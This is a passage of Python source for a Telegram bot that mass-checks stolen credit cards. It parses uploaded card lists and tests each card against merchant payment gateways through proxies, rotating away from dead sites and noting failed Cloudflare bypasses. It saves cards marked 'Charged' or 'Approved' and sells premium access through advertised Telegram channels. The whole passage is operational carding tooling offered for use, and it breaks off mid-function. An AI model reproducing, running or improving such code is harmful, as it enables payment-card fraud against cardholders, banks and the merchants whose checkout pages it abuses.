        for j, (card, result) in enumerate(zip(batch, results)):
            if isinstance(result, Exception):
                result = {"Response": f"Exception: {str(result)}", "Price": "-", "Gateway": "-"}

            start_time = time.time()
            end_time = time.time()
            elapsed_time = round(end_time - start_time, 2)
            brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
            response_text = result.get("Response", "").lower()
            status_text = result.get("Status", "").lower()
            
            # Check for charged status
            is_charged = False
            if "charged" in response_text or "charged" in status_text:
                status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
                status_result = "Charged"
                is_charged = True
                await save_approved_card(card, status_result, result.get('Response'), result.get('Gateway'), result.get('Price'))
            elif "cloudflare bypass failed" in response_text:
                status_header = "   𝙐𝘿𝙁𝙇  𝙀  𝙋𝙊𝙏𝙏𝙀𝘿 ⚠️"
                result["Response"] = "Cloudflare spotted 🤡 change site or try again"
            elif "thank you" in response_text or "payment successful" in response_text:
                status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
                status_result = "Charged"
                is_charged = True
                await save_approved_card(card, status_result, result.get('Response'), result.get('Gateway'), result.get('Price'))
            elif any(key in response_text for key in ["invalid_cvv", "incorrect_cvv", "insufficient_funds", "approved", "success", "invalid_cvc", "incorrect_cvc", "incorrect_zip", "insufficient funds"]):
                status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
                status_result = "Approved"
                await save_approved_card(card, "APPROVED", result.get('Response'), result.get('Gateway'), result.get('Price'))
            else:
                status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"
                status_result = "Declined"
            card_msg = f"""{status_header}

𝗖𝗖 ⇾ `{card}`
𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ {result.get('Gateway', 'Unknown')}
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {result.get('Response')}
𝗣𝗿𝗶𝗰𝗲 ⇾ {result.get('Price')} 💸
𝗦𝗶𝘁𝗲 ⇾ {current_site_index + 1}

```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```

𝗧𝗼𝗼𝙠 {elapsed_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝙨
"""
            result_msg = await event.reply(card_msg)
            if is_charged: await pin_charged_message(event, result_msg)
            await asyncio.sleep(0.1)

    await sent_msg.edit(f"```✅ 𝙈𝙖𝙨𝙨 𝘾𝙝𝙚𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚! 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙚𝙙 {len(cards)} 𝙘𝙖𝙧𝙙𝙨.```")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]mtxt(?:\s|$)'))
async def mtxt(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/+9prhieUj5lI2NTFl")]]
        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙧𝙚𝙫𝟯𝙧𝙨𝙚𝙭", buttons=buttons)
    
    # Check if user has added proxy
    proxy_data = await get_user_proxy(event.sender_id)
    if not proxy_data:
        return await event.reply("⚠️ 𝙋𝙧𝙤𝙭𝙮 𝙍𝙚𝙦𝙪𝙞𝙧𝙚𝙙!\n\n𝙋𝙡𝙚𝙖𝙨𝙚 𝙖𝙙𝙙 𝙖 𝙥𝙧𝙤𝙭𝙮 𝙛𝙞𝙧𝙨𝙩 𝙪𝙨𝙞𝙣𝙜:\n`/addpxy ip:port:username:password`\n\n𝙊𝙧 𝙬𝙞𝙩𝙝𝙤𝙪𝙩 𝙖𝙪𝙩𝙝:\n`/addpxy ip:port`")
    
    user_id = event.sender_id
    if user_id in ACTIVE_MTXT_PROCESSES: return await event.reply("```𝙔𝙤𝙪𝙧 𝘾𝘾 is 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳 𝙬𝙖𝙞𝙩 𝙛𝙤𝙧 𝙘𝙤𝙢𝙥𝙡𝙚𝙩𝙚```")
    try:
        if not event.reply_to_msg_id: return await event.reply("```𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙙𝙤𝙘𝙪𝙢𝙚𝙣𝙩 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙬𝙞𝙩𝙝 /𝙢𝙩𝙭𝙩```")
        replied_msg = await event.get_reply_message()
        if not replied_msg or not replied_msg.document: return await event.reply("```𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙙𝙤𝙘𝙪𝙢𝙚𝙣𝙩 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙬𝙞𝙩𝙝 /𝙢𝙩𝙭𝙩```")
        file_path = await replied_msg.download_media()
        try:
            async with aiofiles.open(file_path, "r") as f: lines = (await f.read()).splitlines()
            os.remove(file_path)
        except Exception as e:
            try: os.remove(file_path)
            except: pass
            return await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧 𝙧𝙚𝙖𝙙𝙞𝙣𝙜 𝙛𝙞𝙡𝙚: {e}")
        cards = [line for line in lines if re.match(r'\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', line)]
        if not cards: return await event.reply("𝘼𝙣𝙮 𝙑𝙖𝙡𝙞𝙙 𝘾𝘾 𝙣𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🥲")
        cc_limit = get_cc_limit(access_type, user_id)
        total_cards_found = len(cards)
        if len(cards) > cc_limit:
            cards = cards[:cc_limit]
            await event.reply(f"""```📝 𝙁𝙤𝙪𝙣𝙙 {total_cards_found} 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚
⚠️ 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙤𝙣𝙡𝙮 𝙛𝙞𝙧𝙨𝙩 {cc_limit} 𝘾𝘾𝙨 (𝙮𝙤𝙪𝙧 𝙡𝙞𝙢𝙞𝙩)
🔥 {len(cards)} 𝘾𝘾𝙨 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙘𝙝𝙚𝙘𝙠𝙚𝙙```""")
        else: await event.reply(f"""```📝 𝙁𝙤𝙪𝙣𝙙 {total_cards_found} 𝙫𝙖𝙡𝙞𝙙 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚
🔥 𝘼𝙡𝙡 {len(cards)} 𝘾𝘾𝙨 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙘𝙝𝙚𝙘𝙠𝙚𝙙```""")
        sites = await load_json(SITE_FILE)
        user_sites = sites.get(str(event.sender_id), [])
        if not user_sites: return await event.reply("𝙎𝙞𝙩𝙚 𝙉𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 𝙄𝙣 𝙔𝙤𝙪𝙧 𝘿𝙗")
        ACTIVE_MTXT_PROCESSES[user_id] = True
        asyncio.create_task(process_mtxt_cards(event, cards, user_sites.copy()))
    except Exception as e:
        ACTIVE_MTXT_PROCESSES.pop(user_id, None)
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

async def process_mtxt_cards(event, cards, local_sites):
    # Get username
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{event.sender_id}"
    except:
        username = f"user_{event.sender_id}"
    
    user_id = event.sender_id
    total = len(cards)
    checked, approved, charged, declined = 0, 0, 0, 0
    status_msg = await event.reply(f"```𝙎𝙤మె𝙩𝙝𝙞𝙣𝙜 𝘽𝙞𝙜 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳```")
    cards_per_site = 4
    current_site_index = 0
    cards_on_current_site = 0

    try:
        batch_size = 20
        for i in range(0, len(cards), batch_size):
            if not local_sites:
                await status_msg.edit("❌ **All your sites are dead!**\nPlease add fresh sites using `/add` and try again.")
                break

            batch = cards[i:i+batch_size]
            tasks = []
            task_cards = []

            if user_id not in ACTIVE_MTXT_PROCESSES:
                final_caption = f"""⛔ 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙎𝙩𝙤𝙥𝙥𝙚𝙙!
𝙏𝙤𝙩𝙖𝙡 𝘾𝙃𝘼𝙍𝙂𝙀 💎 : {charged}
𝙏𝙤𝙩𝙖𝙡 𝘼𝙥𝙥𝙧𝙤𝙫𝙚 🔥 : {approved}
𝙏𝙤𝙩𝙖𝙡 𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ❌ : {declined}
𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 ☠️ : {checked}/{total}
"""
                final_buttons = [[Button.inline(f"𝘾𝙃𝘼𝙍𝙂𝙀 ➜ [ {charged} ] 💎", b"none")], [Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved} ] 🔥", b"none")], [Button.inline(f"𝙎𝙩𝙤𝙥 ➜ [{checked}/{total}] ⛔", b"none")]]
                try: await status_msg.edit(final_caption, buttons=final_buttons)
                except: pass
                return

            for card in batch:
                if user_id not in ACTIVE_MTXT_PROCESSES or not local_sites:
                    break
                current_site = local_sites[current_site_index]
                tasks.append(check_card_specific_site(card, current_site, user_id))
                # Store the actual site URL instead of index to avoid index errors
                task_cards.append((card, current_site))
                cards_on_current_site += 1
                if cards_on_current_site >= cards_per_site:
                    current_site_index = (current_site_index + 1) % len(local_sites)
                    cards_on_current_site = 0
            
            if not tasks: continue

            results = await asyncio.gather(*tasks, return_exceptions=True)

            for j, (result, (card, site_used)) in enumerate(zip(results, task_cards)):
                if user_id not in ACTIVE_MTXT_PROCESSES: break

                if isinstance(result, Exception):
                    result = {"Response": f"Exception: {str(result)}", "Price": "-", "Gateway": "-"}

                checked += 1
                start_time = time.time()
                end_time = time.time()
                elapsed_time = round(end_time - start_time, 2)
                
                response_text = result.get("Response", "")
                response_text_lower = response_text.lower()

                if is_site_dead(response_text):
                    declined += 1
                    if site_used in local_sites:
                        local_sites.remove(site_used)
                        all_sites_data = await load_json(SITE_FILE)
                        if str(user_id) in all_sites_data and site_used in all_sites_data[str(user_id)]:
                            all_sites_data[str(user_id)].remove(site_used)
                            await save_json(SITE_FILE, all_sites_data)
                        current_site_index = 0
                        cards_on_current_site = 0
                    
                    # Check if all sites are now dead
                    if not local_sites:
                        final_caption = f"""⛔ **All sites are dead!**
Please add fresh sites using `/add` and try again.

𝙏𝙤𝙩𝙖𝙡 𝘾𝙃𝘼𝙍𝙂𝙀 💎 : {charged}
𝙏𝙤𝙩𝙖𝙡 𝘼𝙥𝙥𝙧𝙤𝙫𝙚 🔥 : {approved}
𝙏𝙤𝙩𝙖𝙡 𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ❌ : {declined}
𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 ☠️ : {checked}/{total}
"""
                        final_buttons = [[Button.inline(f"𝘾𝙃𝘼𝙍𝙂𝙀 ➜ [ {charged} ] 💎", b"none")], [Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved} ] 🔥", b"none")], [Button.inline(f"𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨! ➜ [{checked}/{total}] ⛔", b"none")]]
                        try: await status_msg.edit(final_caption, buttons=final_buttons)
                        except: pass
                        ACTIVE_MTXT_PROCESSES.pop(user_id, None)
                        return
                    continue

                if "3d" in response_text_lower:
                    declined += 1
                    continue

                brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
                should_send_message = False

                status_text_lower = result.get("Status", "").lower()
                
                # Check for charged status
                if "charged" in response_text_lower or "charged" in status_text_lower:
                    charged += 1
                    status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
                    await save_approved_card(card, "CHARGED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                    should_send_message = True
                elif "cloudflare bypass failed" in response_text_lower:
                    status_header = "𝘾𝙇𝙊𝙐𝘿𝙁𝙇𝘼𝙍𝙀 𝙎𝙋𝙊𝙏𝙏𝙀𝘿 ⚠️"
                    result["Response"] = "Cloudflare spotted 🤡 change site or try again"
                    checked -= 1
                elif "thank you" in response_text_lower or "payment successful" in response_text_lower:
                    charged += 1
                    status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
                    await save_approved_card(card, "CHARGED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                    should_send_message = True
                elif any(key in response_text_lower for key in ["invalid_cvv", "incorrect_cvv", "insufficient_funds", "approved", "success", "invalid_cvc", "incorrect_cvc", "incorrect_zip", "insufficient funds"]):
                    approved += 1
                    status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
                    await save_approved_card(card, "APPROVED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                    should_send_message = True
                else:
                    declined += 1
                    status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"

                # Get site index for display (find current position in list)
                try:
                    display_site_index = local_sites.index(site_used) + 1 if site_used in local_sites else "?"
                except:
                    display_site_index = "?"

                if should_send_message:
                    card_msg = f"""{status_header}

𝗖𝗖 ⇾ `{card}`
𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ {result.get('Gateway', 'Unknown')}
𝗥𝗲𝙨𝙥𝙤𝙣𝙨𝗲 ⇾ {result.get('Response')}
𝗣𝗿𝗶𝗰𝗲 ⇾ {result.get('Price')} 💸
𝗦𝗶𝘁𝗲 ⇾ {display_site_index}

```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```

𝗧𝗼𝗼𝙠 {elapsed_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝙨
"""
                    result_msg = await event.reply(card_msg)
                    # Pin if charged
                    if "charged" in response_text_lower or "charged" in status_text_lower or "thank you" in response_text_lower or "payment successful" in response_text_lower:
                        await pin_charged_message(event, result_msg)
                
                buttons = [
                    [Button.inline(f"𝗖𝗮𝗿𝗱 ➜ {card[:12]}****", b"none")],
                    [Button.inline(f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {result.get('Response')[:25]}...", b"none")],
                    [Button.inline(f"𝗦𝗶𝘁𝗲 ➜ [ {display_site_index} ]", b"none")],
                    [Button.inline(f"𝘾𝙃𝘼𝙍𝙂𝙀 ➜ [ {charged} ] 💎", b"none")],
                    [Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved} ] 🔥", b"none")],
                    [Button.inline(f"𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ➜ [ {declined} ] ❌", b"none")],
                    [Button.inline(f"𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨 ➜ [{checked}/{total}] ✅", b"none")],
                    [Button.inline("⛔ 𝙎𝙩𝙤𝙥", f"stop_mtxt:{user_id}".encode())]
                ]
                try: await status_msg.edit("```𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳 𝘾𝘾𝙨 𝙊𝙣𝙚 𝙗𝙮 𝙊𝙣𝙚...```", buttons=buttons)
                except: pass
                await asyncio.sleep(0.1)

        final_caption = f"""✅ 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚!
𝙏𝙤𝙩𝙖𝙡 𝘾𝙃𝘼𝙍𝙂𝙀 💎 : {charged}
𝙏𝙤𝙩𝙖𝙡 𝘼𝙥𝙥𝙧𝙤𝙫𝙚 🔥 : {approved}
𝙏𝙤𝙩𝙖𝙡 𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ❌ : {declined}
𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 ☠️ : {total}
"""
        final_buttons = [[Button.inline(f"𝘾𝙃𝘼𝙍𝙂𝙀 ➜ [ {charged} ] 💎", b"none")], [Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved} ] 🔥", b"none")], [Button.inline(f"𝙏𝙤𝙩𝙖𝙡 ➜ [{total}] ☠️", b"none")], [Button.inline(f"𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 ➜ [{checked}/{total}] ✅", b"none")]]
        try: await status_msg.edit(final_caption, buttons=final_buttons)
        except: pass
    finally: ACTIVE_MTXT_PROCESSES.pop(user_id, None)


@client.on(events.CallbackQuery(pattern=rb"stop_mtxt:(\d+)"))
async def stop_mtxt_callback(event):
    try:
        match = event.pattern_match
        process_user_id = int(match.group(1).decode())
        clicking_user_id = event.sender_id
        can_stop = False
        if clicking_user_id == process_user_id: can_stop = True
        elif clicking_user_id in ADMIN_ID: can_stop = True
        if not can_stop: return await event.answer("```❌ 𝙔𝙤𝙪 𝙘𝙖𝙣 𝙤𝙣𝙡𝙮 𝙨𝙩𝙤𝙥 𝙮𝙤𝙪𝙧 𝙤𝙬𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨!```", alert=True)
        if process_user_id not in ACTIVE_MTXT_PROCESSES: return await event.answer("```❌ 𝙉𝙤 𝙖𝙘𝙩𝙞𝙫𝙚 𝙥𝙧𝙤𝙘𝙚𝙨𝙨 𝙛𝙤𝙪𝙣𝙙!```", alert=True)
        ACTIVE_MTXT_PROCESSES.pop(process_user_id, None)
        await event.answer("```⛔ 𝘾𝘾 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙨𝙩𝙤𝙥𝙥𝙚𝙙!```", alert=True)
    except Exception as e: await event.answer(f"```❌ 𝙀𝙧𝙧𝙤𝙧: {str(e)}```", alert=True)

# Admin command to clear stuck processes
@client.on(events.NewMessage(pattern='/clear'))
async def clear_processes(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙!")
    
    global ACTIVE_MTXT_PROCESSES, ACTIVE_RZP_PROCESSES, ACTIVE_STRIPE_PROCESSES
    
    # Clear all active processes
    ACTIVE_MTXT_PROCESSES.clear()
    ACTIVE_RZP_PROCESSES.clear()
    ACTIVE_STRIPE_PROCESSES.clear()
    
    await event.reply("```✅ 𝘼𝙡𝙡 𝙨𝙩𝙪𝙘𝙠 𝙥𝙧𝙤𝙘𝙚𝙨𝙨𝙚𝙨 𝙘𝙡𝙚𝙖𝙧𝙚𝙙!```")

# /cmds command - shows gates menu (simple version)
@client.on(events.NewMessage(pattern=r'(?i)^[/.]cmds(?:\s|$)'))
async def cmds(event):
    _, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": 
        return await event.reply(banned_user_message())
    
    cmds_text = """<pre>JOIN BEFORE USING. ✔️</pre>
<b>~ Main :</b> <b><a href="https://t.me/rev3rsexmain">Join Now</a></b>
<b>~ Chat Group :</b> <b><a href="https://t.me/Stripenigga">Join Now</a></b>
<b>~ Scrapper :</b> <b><a href="https://t.me/+1741zA41XcMzMDdl">Join Now</a></b>
<b>~ Note :</b> <code>Report Bugs To @rev3rsexbot</code>
<b>~ Proxy :</b> <code>Live 💎</code>
<pre>Choose Your Gate Type :</pre>"""

    cmds_buttons = [
        [Button.inline("Gates", b"cmds_gates"), Button.inline("Tools", b"cmds_tools")],
        [Button.inline("Close", b"close")]
    ]
    
    await event.reply(cmds_text, buttons=cmds_buttons, parse_mode='html', link_preview=False)

@client.on(events.NewMessage(pattern='/info'))
async def info(event):
    if await is_banned_user(event.sender_id): return await event.reply(banned_user_message())
    user = await event.get_sender()
    user_id = event.sender_id
    first_name = user.first_name or "𝙉/𝘼"
    last_name = user.last_name or ""
    full_name = f"{first_name} {last_name}".strip()
    username = f"@{user.username}" if user.username else "𝙉/𝘼"
    has_premium = await is_premium_user(user_id)
    premium_status = "✅ 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝘼𝙘𝙘𝙚𝙨𝙨" if has_premium else "❌ 𝙉𝙤 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝘼𝙘𝙘𝙚𝙨𝙨"
    sites = await load_json(SITE_FILE)
    user_sites = sites.get(str(user_id), [])
    if user_sites: sites_text = "\n".join([f"{idx + 1}. {site}" for idx, site in enumerate(user_sites)])
    else: sites_text = "𝙉𝙤 𝙨𝙞𝙩𝙚𝙨 𝙖𝙙𝙙𝙚𝙙"

    info_text = f"""👤 𝙐𝙨𝙚𝙧 𝙄𝙣𝙛𝙤𝙧𝙢𝙖𝙩𝙞𝙤𝙣

𝙉𝙖𝙢𝙚 ⇾ {full_name}
𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚 ⇾ {username}
𝙐𝙨𝙚𝙧 𝙄𝘿 ⇾ `{user_id}`
𝙋𝙧  𝙞𝙫𝙖𝙩𝙚 𝘼𝙘𝙘𝙚𝙨𝙨 ⇾ {premium_status}

𝙎𝙞𝙩𝙚𝙨 ⇾ ({len(user_sites)}):

```
{sites_text}

```
"""

    await event.reply(info_text)

@client.on(events.NewMessage(pattern='/stats'))
async def stats(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙!")

    try:
        premium_users = await load_json(PREMIUM_FILE)
        free_users = await load_json(FREE_FILE)
        user_sites = await load_json(SITE_FILE)
        keys_data = await load_json(KEYS_FILE)

        stats_content = "🔥 BOT STATISTICS REPORT 🔥\n"
        stats_content += "=" * 50 + "\n\n"

        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        stats_content += f"📅 Generated on: {current_time}\n\n"

        stats_content += "👥 USER STATISTICS\n"
        stats_content += "-" * 30 + "\n"

        all_user_ids = set()
        all_user_ids.update(premium_users.keys())
        all_user_ids.update(free_users.keys())
        all_user_ids.update(user_sites.keys())

        total_users = len(all_user_ids)
        total_premium = len(premium_users)
        total_free = total_users - total_premium

        stats_content += f"📊 Total Unique Users: {total_users}\n"
        stats_content += f"💎 Premium Users: {total_premium}\n"
        stats_content += f"🆓 Free Users: {total_free}\n\n"

        if premium_users:
            stats_content += "💎 PREMIUM USERS DETAILS\n"
            stats_content += "-" * 30 + "\n"

            for user_id, user_data in premium_users.items():
                expiry_date = datetime.datetime.fromisoformat(user_data['expiry'])
                current_date = datetime.datetime.now()

                status = "ACTIVE" if current_date <= expiry_date else "EXPIRED"
                days_remaining = (expiry_date - current_date).days if current_date <= expiry_date else 0

                stats_content += f"User ID: {user_id}\n"
                stats_content += f"  Status: {status}\n"
                stats_content += f"  Days Given: {user_data.get('days', 'N/A')}\n"
                stats_content += f"  Added By: {user_data.get('added_by', 'N/A')}\n"
                stats_content += f"  Expires: {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}\n"
                stats_content += f"  Days Remaining: {days_remaining}\n"
                stats_content += "-" * 20 + "\n"

        stats_content += "\n🌐 SITES STATISTICS\n"
        stats_content += "-" * 30 + "\n"

        total_sites_count = sum(len(sites) for sites in user_sites.values())
        users_with_sites = len([uid for uid, sites in user_sites.items() if sites])

        stats_content += f"📈 Total Sites Added: {total_sites_count}\n"
        stats_content += f"👤 Users with Sites: {users_with_sites}\n"

        if user_sites:
            stats_content += f"\nSites per User:\n"
            for user_id, sites in user_sites.items():
                if sites:
                    stats_content += f"  User {user_id}: {len(sites)} sites\n"
                    for site in sites:
                        stats_content += f"    - {site}\n"

        stats_content += f"\n🔑 KEYS STATISTICS\n"
        stats_content += "-" * 30 + "\n"

        total_keys = len(keys_data)
        used_keys = len([k for k, v in keys_data.items() if v.get('used', False)])
        unused_keys = total_keys - used_keys

        stats_content += f"🔢 Total Keys Generated: {total_keys}\n"
        stats_content += f"✅ Used Keys: {used_keys}\n"
        stats_content += f"⏳ Unused Keys: {unused_keys}\n"

        if keys_data:
            stats_content += f"\nKeys Details:\n"
            for key, key_data in keys_data.items():
                status = "USED" if key_data.get('used', False) else "UNUSED"
                used_by = key_data.get('used_by', 'N/A')
                days = key_data.get('days', 'N/A')
                created = key_data.get('created_at', 'N/A')
                used_at = key_data.get('used_at', 'N/A')

                stats_content += f"  Key: {key}\n"
                stats_content += f"    Status: {status}\n"
                stats_content += f"    Days Value: {days}\n"
                stats_content += f"    Created: {created}\n"
                if status == "USED":
                    stats_content += f"    Used By: {used_by}\n"
                    stats_content += f"    Used At: {used_at}\n"
                stats_content += "-" * 15 + "\n"

        stats_content += f"\n👑 ADMIN STATISTICS\n"
        stats_content += "-" * 30 + "\n"
        stats_content += f"🛡️ Total Admins: {len(ADMIN_ID)}\n"
        stats_content += f"Admin IDs: {', '.join(map(str, ADMIN_ID))}\n"

        if os.path.exists(CC_FILE):
            try:
                async with aiofiles.open(CC_FILE, "r", encoding="utf-8") as f:
                    cc_content = await f.read()
                cc_lines = cc_content.strip().split('\n') if cc_content.strip() else []
                approved_cards = len([line for line in cc_lines if 'APPROVED' in line])
                charged_cards = len([line for line in cc_lines if 'CHARGED' in line])

                stats_content += f"\n💳 CARD STATISTICS\n"
                stats_content += "-" * 30 + "\n"
                stats_content += f"📊 Total Processed Cards: {len(cc_lines)}\n"
                stats_content += f"✅ Approved Cards: {approved_cards}\n"
                stats_content += f"💎 Charged Cards: {charged_cards}\n"
            except:
                pass

        stats_content += "\n" + "=" * 50 + "\n"
        stats_content += "📋 END OF REPORT 📋"

        stats_filename = f"bot_stats_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        async with aiofiles.open(stats_filename, "w", encoding="utf-8") as f:
            await f.write(stats_content)

        await event.reply("📊 𝘽𝙤𝙩 𝙨𝙩𝙖𝙩𝙞𝙨𝙩𝙞𝙘𝙨 𝙧𝙚𝙥𝙤𝙧𝙩 𝙜𝙚𝙣𝙚𝙧𝙖𝙩𝙚𝙙!", file=stats_filename)

        os.remove(stats_filename)

    except Exception as e:
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧 𝙜𝙚𝙣𝙚𝙧𝙖𝙩𝙞𝙣𝙜 𝙨𝙩𝙖𝙩𝙨: {e}")



@client.on(events.NewMessage(pattern=r'(?i)^[/.]ran(?:\s|$)'))
async def ranfor(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/+9prhieUj5lI2NTFl")]]
        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙧𝙚𝙫𝟯𝙧𝙨𝙚𝙭", buttons=buttons)
    
    # Check if user has added proxy
    proxy_data = await get_user_proxy(event.sender_id)
    if not proxy_data:
        return await event.reply("⚠️ 𝙋𝙧𝙤𝙭𝙮 𝙍𝙚𝙦𝙪𝙞𝙧𝙚𝙙!\n\n𝙋𝙡𝙚𝙖𝙨𝙚 𝙖𝙙𝙙 𝙖 𝙥𝙧𝙤𝙭𝙮 𝙛𝙞𝙧𝙨𝙩 𝙪𝙨𝙞𝙣𝙜:\n`/addpxy ip:port:username:password`\n\n𝙊𝙧 𝙬𝙞𝙩𝙝𝙤𝙪𝙩 𝙖𝙪𝙩𝙝:\n`/addpxy ip:port`")
    
    user_id = event.sender_id
    if user_id in ACTIVE_MTXT_PROCESSES: return await event.reply("```𝙔𝙤𝙪𝙧 𝘾𝘾 is 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳 𝙬𝙖𝙞𝙩 𝙛𝙤𝙧 𝙘𝙤𝙢𝙥𝙡𝙚𝙩𝙚```")
    try:
